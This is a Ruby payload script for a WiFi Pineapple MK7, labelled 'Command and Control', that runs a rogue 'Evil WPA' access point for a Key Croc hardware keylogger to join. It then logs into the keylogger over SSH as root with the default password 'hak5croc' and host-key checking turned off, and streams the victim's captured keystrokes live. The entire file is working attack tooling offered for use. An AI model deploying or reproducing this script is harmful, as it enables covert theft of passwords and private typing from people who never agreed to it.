#
# Title:            HAK5 - Key Croc
#
# Description:      Real-time recovery of keystrokes from a keyboard with
#                   https://shop.hak5.org/products/key-croc
#
# Author:           TW-D
# Version:          1.0
# Category:         Command and Control
#

require_relative('../../classes/PineappleMK7.rb')

system_authentication = PineappleMK7::System::Authentication.new
system_authentication.host = "172.16.42.1"
system_authentication.port = 1471
system_authentication.mac = "00:13:37:DD:EE:FF"
system_authentication.password = "<ROOT-ACCOUNT-PASSWORD>"

if (system_authentication.login)

    led = PineappleMK7::System::LED.new

    # SETUP
    #
    led.setup

    reset_settings = PineappleMK7::Modules::PineAP::Settings.new
    reset_settings.save

    pineap_filtering = PineappleMK7::Modules::PineAP::Filtering.new
    pineap_filtering.client_filter('deny')
    pineap_filtering.ssid_filter('deny')

    evil_wpa = PineappleMK7::Modules::PineAP::EvilWPA.new
    
    INTERVAL = 10
    pineap_clients = PineappleMK7::Modules::PineAP::Clients.new

    KEYCROC_PASSWORD = 'hak5croc'

    # ATTACK
    #
    led.attack

    puts('[+] Starting "PineAP Evil WPA"')

    evil_wpa.ssid = "KeyCroc_C2"
    evil_wpa.password = "Pre-shared_Key" # Password must be between 8 and 63 characters
    evil_wpa.enabled = true
    evil_wpa.save

    # SPECIAL
    #
    led.special

    puts('[*] Waiting for a "Key Croc" ...')

    while(true)
        sleep(INTERVAL)
        connected_clients = pineap_clients.connected_clients
        if (!connected_clients.empty? and !(connected_clients[0].ip).empty?)
            puts('[+] The connection of a "Key Croc" is detected')
            client = connected_clients[0]
            pp(client)
            puts('[*] Real-time recovery of keystrokes from a keyboard ... [CTRL+c]')
            begin
                IO.popen(
                [
                'sshpass',
                "-p #{KEYCROC_PASSWORD}",
                'ssh',
                '-o ConnectTimeout=5',
                '-o StrictHostKeyChecking="no"',
                '-o UserKnownHostsFile="/dev/null"',
                "-p 22",
                "-q root@#{client.ip}",
                "tail -f /root/loot/croc_char.log"
                ].join(' '),
                'r+'
                ) do |io|
                    io.sync = true
                    while (croc_char = io.getc)
                        print(croc_char)
                    end
                end
            rescue Interrupt
                puts('[-] Interrupt Signal')
                IO.popen(
                [
                'sshpass',
                "-p #{KEYCROC_PASSWORD}",
                'ssh',
                '-o ConnectTimeout=5',
                '-o StrictHostKeyChecking="no"',
                '-o UserKnownHostsFile="/dev/null"',
                "-p 22",
                "-q root@#{client.ip}",
                'killall tail'
                ].join(' '),
                'r'
                )
                break
            end
        end
    end

    # FINISH
    #
    led.finish

    puts('[+] Stopping "PineAP Evil WPA"')

    reset_evil = PineappleMK7::Modules::PineAP::EvilWPA.new
    reset_evil.save

    # CLEANUP
    #
    led.cleanup

    puts('[+] Cleaning of previous clients')

    pineap_clients.clear_previous

    # OFF
    #
    led.off

end